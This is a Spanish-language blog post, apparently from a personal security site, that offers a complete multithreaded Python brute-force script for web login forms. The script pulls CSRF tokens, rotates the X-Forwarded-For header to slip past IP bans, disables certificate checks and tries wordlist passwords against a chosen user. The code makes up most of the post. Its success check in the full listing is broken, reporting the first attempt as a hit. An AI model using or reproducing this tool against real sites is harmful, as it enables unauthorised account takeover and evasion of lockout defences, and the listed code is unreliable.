# Brute-Force Login With Threads

# [https://pastebin.com/9gW4iGkJ](https://pastebin.com/9gW4iGkJ)

![Untitled](/assets/images/Brute-Force-Login-With-Threads/Untitled.png)

He realizado este script ya que he estado investigando un poco y me parecía que no habían muchos scripts en python3 que realicen fuerza bruta a un login, por eso he decidido compartirlo con vosotros.

Primero que nada os voy a comentar un poco lo que hace este script y como debéis de usarlo ya que no funciona para cualquier pagina, actualmente en esta “version” únicamente funciona contra paginas que tengan o no tengan un tokenCSRF, en caso de que no lo tengan implementado y unicamente se tramite por POST el “username” y el “password” tenéis que cambiar la configuración del script de esta forma:

```python
#Extraccion del token anti-csrf
        #token = re.findall(r'id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)[0]
        post_data = {
            #'tokenCSRF': '%s' % token,
            'username' : '%s' % username,
            'password' : '%s' % password,
            'save': ''
        }
```

También tenéis que configurar la respuesta del lado del servidor para comprobar si la contraseña es correcta o no lo es, para ello realizareis una petición con unas credenciales incorrectas y veréis el típico error al fallar las credenciales como por ej: “Invalid credentials”, sabiendo la respuesta del lado del servidor configurareis el script de la siguiente forma:

```python
#Configuracion de la respuesta del servidor para averiguar la contraseña
        if "Invalid credentials" not in r.text:
            print(Color.BLUE + "\n\nLa contraseña es: " + Color.YELLOW + "%s" % password)
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(1)
        else:
            pass
```

Por mi experiencia en la creación del script recomiendo no usar mas de 2 hilos de velocidad (esta puesto 2 hilos por defecto), ya que estos tipos de ataques dependen mucho de la velocidad de respuesta del servidor web, y si le metemos muchos hilos va a ir muy rápido pero no le dará tiempo a comprobar si la contraseña es correcta o no. Todo depende de la velocidad del servidor.

Os dejo por aquí también el script:

```python
#!/usr/bin/python3
# -*- coding: utf-8 -*-
 
import requests
from pwn import *
import urllib3
import mmap
import argparse
 
from concurrent.futures import ThreadPoolExecutor
  
# CTRL+C
def def_hundler(sig, frame):
    print(Color.RED + "[!]Saliendo..")
    exit(1)
signal.signal(signal.SIGINT, def_hundler) 
 
#Colores
class Color:
    CYAN = '\033[96m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
#Funciones
def usage():
    fNombre = os.path.basename(__file__)
    ussage = fNombre + ' [-h] -url <URL> [-u USERNAME] [-w DICCIONARIO] [-t HILOS]\n\n'
    ussage += '[+] Examples:\n'
    ussage += '\t' + fNombre + ' -url https://google.com/login -u admin -w /usr/share/wordlists/rockyou.txt -t 2\n'
    return ussage
 
def arguments():
    parse = argparse.ArgumentParser(usage=usage(), description="Python3 Brute-Force login with threads")
    parse.add_argument('-u', dest='username', type=str, default='', help='Usuario a reventar')
    parse.add_argument('-w', dest='diccionario', type=str, default='', help='Diccionario a usar')
    parse.add_argument('-url', dest='url', type=str, help='URL del login')
    parse.add_argument('-t', dest='threads', type=int, default='2', help='Hilos (Velocidad), Default -> [2]')
    return parse.parse_args()
 
#Funcion para sacar el numero de palabras de un diccionario 
def get_num_lines(diccionario):
    fp = open(diccionario, "r+")
    buf = mmap.mmap(fp.fileno(), 0)
    lines = 0
    while buf.readline():
        lines += 1
    return lines
 
 
def do_login(s, url, username, password, executor, count, total):
 
    try:
        r = s.get(url)
        #Extraccion del token anti-csrf
        token = re.findall(r'id="jstokenCSRF" name="tokenCSRF" value="(.*?)"', r.text)[0]
        post_data = {
            'tokenCSRF': '%s' % token,
            'username' : '%s' % username,
            'password' : '%s' % password,
            'save': ''
        }
        headers_data = {
            #Bypass IP-BAN
            'X-Forwarded-For': '%s' % password,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        }
#        proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        r = s.post(url, data=post_data, headers=headers_data, allow_redirects = True)
        p1.status(Color.BLUE + "Intentando con la contraseña" + Color.RED + " [%d/" %count + "%d] ==>" %total + Color.GREEN + " %s" %password)        
        #Configuracion de la respuesta del servidor para averiguar la contraseña
        if "" in r.text:
            print(Color.BLUE + "\n\nLa contraseña es: " + Color.YELLOW + "%s" % password)
            executor.shutdown(wait=False, cancel_futures=True)
            sys.exit(1)
        else:
            pass
 
    except Exception as e:
        print(e)
 
def main(url, username, diccionario, executor):
    try:
        urllib3.disable_warnings()
        s = requests.session()
        s.verify = False
        count = 0
        with open(diccionario, encoding='latin-1') as fp:
            for password in fp.read().splitlines():
                count += 1
                executor.submit(do_login, s, url, username, password, executor, count, total)
    except Exception as e:
        print(e)
 
if __name__ == '__main__':
    print(Color.CYAN + """
██████╗ ██████╗ ██╗   ██╗████████╗███████╗    ███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗ 
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝    ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗█████╗█████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝╚════╝██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗    ██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝ 
        """)
    args = arguments()
    total = get_num_lines(args.diccionario)
    p1 = log.progress(Color.BLUE + "Fuerza Bruta sobre el usuario :" + Color.RED + " %s" % args.username)    
    executor = ThreadPoolExecutor(args.threads)
    main(args.url, args.username, args.diccionario, executor)
```